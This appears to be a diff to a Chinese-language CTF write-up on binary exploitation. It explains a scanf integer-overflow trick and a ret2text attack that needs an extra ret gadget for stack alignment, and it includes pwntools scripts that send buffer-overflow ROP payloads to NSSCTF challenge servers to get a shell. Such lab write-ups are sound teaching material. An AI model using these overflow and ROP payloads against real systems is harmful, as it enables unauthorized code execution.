@@ -28,7 +28,7 @@ category: CTF
 
 （大端序则反之）
 ![整数溢出](./images/zhengshuyichu.webp)
-如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到shell
+如图，v4为4字节，却尝试用scanf将它视为%lld读入8字节整数，因此会覆盖到位于栈高字节的n1314（rbp-ch），当n1314等于520（0x208）时调用system，那便能拿到`shell`
 
 因此输入0x20800000000在内存中为00 00 00 00 08 02,前面4个00即v4的内存区域，此时n1314被视为520
 
@@ -78,6 +78,34 @@ from pwn import *
 r = remote('node6.anna.nssctf.cn', 20798)
 context(os='linux', arch='amd64', log_level='debug')
 playload = b"a"*0x28+p64(0x4011ff)
+#gdb.attach(r)
+r.recvline()
+r.sendline(playload)
+r.interactive()
+```
+
+## ret调整栈帧
+![ret2text1](images/ret2text1.webp)
+![ROP2](./images/ROP2.webp)
+这题和`ROP`那题看起来几乎是一样的，先试着使用ROP相同的办法写下exp看看，结果发现无法拿到shell，我们使用gdb具体看一下:
+![ret2gdb](images/ret2tiaozhengzhanzheng.webp)
+这里有一个非常重要的知识点：xmm寄存器只有在rsp的末尾为0时才能正常执行，这里的rsp是以8结尾了所以无法正常执行了。  
+
+通过gdb还能发现我们是可以进入`vuln`函数的，但是进入了`vuln`函数我们就做不出什么操作了，于是考虑我们要在进入`vuln`函数之前调整好栈，让其移动8个字节(*这里其实还有一个知识点就是在64位系统的rsp里所以数据都是以8字节存储在栈上，所以结尾不是8就是0*)
+
+**那么怎么移动呢？**
+![ret2gdb](images/ret2tiaozhengzhanzheng2.webp)
+首先我们通过gdb可以发现`main`函数最后是一个`return`函数，所以我们需要使用它return(return函数的作用是把栈顶rsp指向的8个字节作为地址进行下一步执行传给rip~~不知道怎么说清楚了..看下面的图吧~~)到`vuln`函数，并且这样就顺便让栈上多了一个步骤从而实现了移动8字节(~~这一块好难解释啊...~~)
+![ret2gdbret](images/ret2tiaozhengzhanzheng3.webp)
+现在就剩下最后一个任务了，就是找到return函数的地址，这里我们使用ROPgadget来查找
+![ret2gdbret](images/ret2tiaozhengzhanzheng4.webp)
+成功在`0x40101a`处找到return函数
+```python
+from pwn import *
+r = remote('node7.anna.nssctf.cn', 21013)
+#r = process('./main')
+context(os='linux', arch='amd64', log_level='debug')
+playload = b'A' * 0x28 + p64(0x40101a) + p64(0x4011dd)
 #gdb.attach(r)
 r.recvline()
 r.sendline(playload)
